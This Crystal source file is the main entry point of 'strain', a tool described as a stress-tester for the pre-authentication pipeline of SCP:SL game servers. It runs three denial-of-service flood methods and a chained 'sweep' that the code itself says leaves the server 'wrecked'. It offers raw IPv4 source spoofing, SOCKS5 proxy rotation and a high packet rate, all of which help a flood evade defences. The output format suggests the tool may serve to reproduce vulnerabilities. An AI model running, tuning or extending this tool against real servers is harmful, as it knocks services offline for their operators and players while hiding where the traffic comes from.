require "option_parser"
require "./strain/target"
require "./strain/raw_udp"
require "./strain/socks5"
require "./strain/probe"
require "./strain/methods/eclipse"
require "./strain/methods/cascade"
require "./strain/methods/mirage"

module Strain
  VERSION = "0.1.0"

  enum Mode
    Eclipse
    Cascade
    Mirage
    Sweep
    Probe
  end

  struct Args
    property mode : Mode = Mode::Probe
    property target_spec : String = "127.0.0.1:7777"
    property fibers : Int32 = 256
    property duration : Float64 = 10.0
    property cooldown : Float64 = 4.0
    property hot_probes : Int32 = 3
    property cool : Float64 = 10.0
    property timeout : Float64 = 2.0
    property raw_spoof : Bool = false
    property spoof_base : String = "127.64.0.1"
    property spoof_ips : Int32 = 256
    property spoof_ports : Int32 = 64512
    property pps : Int32 = 120_000
    property threads : Int32 = 0
    property proxy_file : String? = nil
    property proxy_timeout : Float64 = 5.0
  end

  MULTITHREAD_BUILD = {% if flag?(:preview_mt) %} true {% else %} false {% end %}
  THREADS_MARKER = "STRAIN_THREADS_ACTIVE"
  METHOD_NAMES = ["eclipse", "cascade", "mirage", "sweep", "probe"]

  def self.banner : String
    <<-BANNER
      strain — SCP:SL preauth pipeline stress-tester

      USAGE
        strain <method> [options]

      METHODS
        eclipse    — Cold/hot/post pulse classifier; DoS, not auth bypass.
        cascade    — _connectionRequests backlog cascad.
                     Responsiveness curve; selective DoS evidence.
        mirage     — _challenges Steam A2S cache O(n) cleanup.
                     A2S RTT amplifier; pre-auth, lowest-cost vector.
        sweep      — eclipse → mirage → cascade. Combined verdict; server
                     is wrecked at the end (cascade lingers — restart needed).
        probe      — single ConnectRequest with mutated signature; classify reply.

      OPTIONS
    BANNER
  end

  def self.parse_args(argv : Array(String)) : Args
    args = Args.new
    parse_argv = argv.dup
    method_seen = false
    # Detect method early so per-mode defaults can override before parsing.
    if method_index = parse_argv.index { |a| METHOD_NAMES.includes?(a) }
      method_seen = true
      args = apply_method(args, parse_argv.delete_at(method_index))
    end

    parser = OptionParser.new do |op|
      op.banner = banner
      op.on("--target SPEC", "Server address as host:port (default 127.0.0.1:7777)") { |s| args.target_spec = s }
      op.on("-f N", "--fibers N", "Concurrency (eclipse default 200, cascade 256, mirage/sweep 128)") { |s| args.fibers = s.to_i }
      op.on("-d S", "--duration S", "Saturation/flood duration in seconds (default #{args.duration})") { |s| args.duration = s.to_f }
      op.on("-c S", "--cooldown S", "Pre-flood pause to reset rate-limit windows (default #{args.cooldown})") { |s| args.cooldown = s.to_f }
      op.on("-p N", "--hot-probes N", "Number of pulses during eclipse saturation (default #{args.hot_probes})") { |s| args.hot_probes = s.to_i }
      op.on("--cool S", "Post-flood drain wait before final probe (default #{args.cool})") { |s| args.cool = s.to_f }
      op.on("--raw-spoof", "Flood methods: use raw IPv4 spoofed source endpoints (needs root/CAP_NET_RAW)") { args.raw_spoof = true }
      op.on("--spoof-base IP", "raw-spoof: first source IPv4 address (default #{args.spoof_base})") { |s| args.spoof_base = s }
      op.on("--spoof-ips N", "raw-spoof: number of sequential source IPs (default #{args.spoof_ips})") { |s| args.spoof_ips = s.to_i }
      op.on("--spoof-ports N", "raw-spoof: source ports per IP from 1024 upward (default #{args.spoof_ports})") { |s| args.spoof_ports = s.to_i }
      op.on("--pps N", "Flood methods: target total fill rate; 0 = unlimited (default #{args.pps})") { |s| args.pps = s.to_i }
      op.on("--threads N", "Re-exec with CRYSTAL_WORKERS=N for true multi-threaded fibers (binary must be built with -Dpreview_mt)") { |s| args.threads = s.to_i }
      op.on("--proxy-file PATH", "SOCKS5 proxy file for UDP ASSOCIATE mode") { |s| args.proxy_file = s }
      op.on("--socks5-file PATH", "Alias for --proxy-file") { |s| args.proxy_file = s }
      op.on("--proxy-timeout S", "SOCKS5 connect/read timeout seconds (default #{args.proxy_timeout})") { |s| args.proxy_timeout = s.to_f }
      op.on("-h", "--help", "Print this help") { puts op; exit 0 }
      op.on("-v", "--version", "Print version") { puts "strain v#{VERSION}"; exit 0 }
      op.unknown_args do |before, after|
        positional = before + after
        if positional.empty?
          unless method_seen
            puts op
            exit 0
          end
        else
          STDERR.puts "unknown argument: #{positional[0]}"
          STDERR.puts op
          exit 2
        end
      end
    end
    parser.parse(parse_argv)
    unless method_seen
      puts parser
      exit 0
    end
    args
  end

  private def self.apply_method(args : Args, method : String) : Args
    case method
    when "eclipse"
      args.mode = Mode::Eclipse
      args.fibers = 200
      args.duration = 4.0
    when "cascade"
      args.mode = Mode::Cascade
      args.fibers = 256
    when "mirage"
      args.mode = Mode::Mirage
      args.fibers = 128
      args.duration = 6.0
    when "sweep"
      args.mode = Mode::Sweep
      args.fibers = 128
    when "probe"
      args.mode = Mode::Probe
    end
    args
  end

  def self.run(argv : Array(String))
    args = parse_args(argv)
    activate_threads!(args, argv)
    target = Target.parse(args.target_spec)
    proxy_pool = build_proxy_pool(args)
    puts "target: #{target}"

    begin
      case args.mode
      when Mode::Probe
        run_probe(target, proxy_pool)
      when Mode::Eclipse
        run_eclipse(target, args, proxy_pool)
      when Mode::Cascade
        run_cascade(target, args, proxy_pool)
      when Mode::Mirage
        run_mirage(target, args, proxy_pool)
      when Mode::Sweep
        run_sweep(target, args, proxy_pool)
      end
    rescue ex : IO::Error | Socket::Error
      STDERR.puts "error: #{ex.message}"
      exit 2
    end
  end

  private def self.build_proxy_pool(args : Args) : Socks5::Pool?
    path = args.proxy_file
    return nil unless path
    if args.raw_spoof
      STDERR.puts "--raw-spoof and --proxy-file are mutually exclusive: SOCKS5 cannot relay raw IPv4 spoofed packets."
      exit 2
    end
    if args.proxy_timeout <= 0
      STDERR.puts "--proxy-timeout must be > 0."
      exit 2
    end

    pool = Socks5::Pool.from_file(path, args.proxy_timeout.seconds)
    puts "proxy: SOCKS5 UDP ASSOCIATE via #{path} (#{pool.proxies.size} proxies, timeout #{args.proxy_timeout}s)"
    pool
  rescue ex
    STDERR.puts "proxy error: #{ex.message}"
    exit 2
  end

  private def self.run_probe(target : Target, proxy_pool : Socks5::Pool?)
    r = Probe.shot(target, proxy_pool: proxy_pool)
    printf "probe: %.1f ms  %s\n", r.rtt_ms, r.label
  end

  private def self.run_eclipse(target : Target, args : Args, proxy_pool : Socks5::Pool?)
    cfg = Eclipse::Config.new(
      target: target,
      fibers: args.fibers,
      saturation: args.duration.seconds,
      cooldown: args.cooldown.seconds,
      hot_probes: args.hot_probes,
      raw_spoof: args.raw_spoof,
      spoof_base: args.spoof_base,
      spoof_ips: args.spoof_ips,
      spoof_ports: args.spoof_ports,
      pps: args.pps,
      proxy_pool: proxy_pool,
    )
    o = Eclipse.run(cfg)
    print_eclipse_summary(o)
    exit(o.reproduced ? 0 : 1)
  end

  private def self.run_cascade(target : Target, args : Args, proxy_pool : Socks5::Pool?)
    cfg = Cascade::Config.new(
      target: target,
      fibers: args.fibers,
      duration: args.duration.seconds,
      cool: args.cool.seconds,
      raw_spoof: args.raw_spoof,
      spoof_base: args.spoof_base,
      spoof_ips: args.spoof_ips,
      spoof_ports: args.spoof_ports,
      pps: args.pps,
      proxy_pool: proxy_pool,
    )
    o = Cascade.run(cfg)
    print_cascade_summary(o)
    exit(o.reproduced ? 0 : 1)
  end

  private def self.run_mirage(target : Target, args : Args, proxy_pool : Socks5::Pool?)
    cfg = Mirage::Config.new(
      target: target,
      fibers: args.fibers,
      duration: args.duration.seconds,
      cool: args.cool.seconds,
      raw_spoof: args.raw_spoof,
      spoof_base: args.spoof_base,
      spoof_ips: args.spoof_ips,
      spoof_ports: args.spoof_ports,
      pps: args.pps,
      proxy_pool: proxy_pool,
    )
    o = Mirage.run(cfg)
    print_mirage_summary(o)
    exit(o.reproduced ? 0 : 1)
  end

  private def self.run_sweep(target : Target, args : Args, proxy_pool : Socks5::Pool?)
    # Order matters: eclipse and mirage both self-heal in ~10-30s, so they
    # come first. Cascade lingers for minutes (queue starvation), so it goes
    # last — the server is wrecked at the end of sweep, restart before re-running.

    puts "─── sweep ─── 1/3 eclipse"
    e_cfg = Eclipse::Config.new(
      target: target,
      fibers: 200,
      saturation: 4.seconds,
      cooldown: args.cooldown.seconds,
      hot_probes: args.hot_probes,
      raw_spoof: args.raw_spoof,
      spoof_base: args.spoof_base,
      spoof_ips: args.spoof_ips,
      spoof_ports: args.spoof_ports,
      pps: args.pps,
      proxy_pool: proxy_pool,
    )
    e = Eclipse.run(e_cfg)
    print_eclipse_summary(e)

    puts ""
    puts "─── sweep ─── settle 30s before mirage"
    sleep 30.seconds

    puts "─── sweep ─── 2/3 mirage"
    m_cfg = Mirage::Config.new(
      target: target,
      fibers: 128,
      duration: 6.seconds,
      cool: args.cool.seconds,
      raw_spoof: args.raw_spoof,
      spoof_base: args.spoof_base,
      spoof_ips: args.spoof_ips,
      spoof_ports: args.spoof_ports,
      pps: args.pps,
      proxy_pool: proxy_pool,
    )
    m = Mirage.run(m_cfg)
    print_mirage_summary(m)

    puts ""
    puts "─── sweep ─── settle 30s before cascade (last — server will be wrecked)"
    sleep 30.seconds

    puts "─── sweep ─── 3/3 cascade"
    c_cfg = Cascade::Config.new(
      target: target,
      fibers: args.fibers,
      duration: args.duration.seconds,
      cool: args.cool.seconds,
      raw_spoof: args.raw_spoof,
      spoof_base: args.spoof_base,
      spoof_ips: args.spoof_ips,
      spoof_ports: args.spoof_ports,
      pps: args.pps,
      proxy_pool: proxy_pool,
    )
    c = Cascade.run(c_cfg)
    print_cascade_summary(c)

    puts ""
    puts "═══ sweep verdict ═══"
    puts "  eclipse: #{e.reproduced ? "REPRODUCED" : "not reproduced"}"
    puts "  mirage:  #{m.reproduced ? "REPRODUCED" : "not reproduced"}"
    puts "  cascade: #{c.reproduced ? "REPRODUCED" : "not reproduced"}"
    all = e.reproduced && m.reproduced && c.reproduced
    puts "  → #{all ? "all three reproduced" : "partial — see above"}"
    exit(all ? 0 : 1)
  end

  private def self.activate_threads!(args : Args, argv : Array(String))
    return if args.threads <= 0

    if args.threads < 1
      STDERR.puts "--threads must be >= 1."
      exit 2
    end

    wanted = args.threads.to_s
    if ENV[THREADS_MARKER]? != wanted || ENV["CRYSTAL_WORKERS"]? != wanted
      exe = Process.executable_path || PROGRAM_NAME
      Process.exec(
        exe,
        argv,
        env: {
          "CRYSTAL_WORKERS" => wanted,
          THREADS_MARKER => wanted,
        }
      )
    end

    unless MULTITHREAD_BUILD
      STDERR.puts "--threads=#{wanted} requested, but this binary was not built with -Dpreview_mt; rebuild with: crystal build -Dpreview_mt src/strain.cr -o bin/strain"
    end
  end

  private def self.print_eclipse_summary(o : Eclipse::Outcome)
    puts ""
    puts "═══ eclipse ═══"
    puts "  cold      : #{o.cold.label}"
    o.hot.each_with_index { |r, i| puts "  hot[#{i}]    : #{r.label}" }
    puts "  post      : #{o.post.label}"
    puts "  packets   : #{o.packets_sent}"
    puts "  endpoints : #{o.endpoints}"
    puts "  accepted  : ~#{o.accepted_estimate}" if o.accepted_estimate
    puts "  udp drops : +#{o.udp_drops_delta}" if o.udp_drops_delta
    puts ""
    puts o.verdict
  end

  private def self.print_mirage_summary(o : Mirage::Outcome)
    puts ""
    puts "═══ mirage ═══"
    printf "  cold A2S    : %s in %.1f ms\n", o.cold_a2s_label, o.cold_a2s_rtt_ms
    printf "  mid A2S     : %s in %.1f ms\n", o.mid_a2s_label, o.mid_a2s_rtt_ms
    printf "  post A2S    : %s in %.1f ms\n", o.post_a2s_label, o.post_a2s_rtt_ms
    puts "  packets     : #{o.packets_sent}"
    puts "  endpoints   : #{o.endpoints}"
    puts "  accepted    : ~#{o.accepted_estimate}" if o.accepted_estimate
    puts "  udp drops   : +#{o.udp_drops_delta}" if o.udp_drops_delta
    puts ""
    puts o.verdict
  end

  private def self.print_cascade_summary(o : Cascade::Outcome)
    puts ""
    puts "═══ cascade ═══"
    puts "  packets       : #{o.packets_sent}"
    puts "  endpoints     : #{o.endpoints}"
    puts "  accepted      : ~#{o.accepted_estimate}" if o.accepted_estimate
    puts "  udp drops     : +#{o.udp_drops_delta}" if o.udp_drops_delta
    puts "  cold pulse    : #{o.cold.label} (#{o.cold.rtt_ms.round(0)} ms)"
    puts "  mid pulse     : #{o.mid.label} (#{o.mid.rtt_ms.round(0)} ms)"
    puts "  post t+0      : #{o.post0.label} (#{o.post0.rtt_ms.round(0)} ms)"
    puts "  post drained : #{o.post10.label} (#{o.post10.rtt_ms.round(0)} ms)"
    puts ""
    puts o.verdict
  end
end

Strain.run(ARGV)
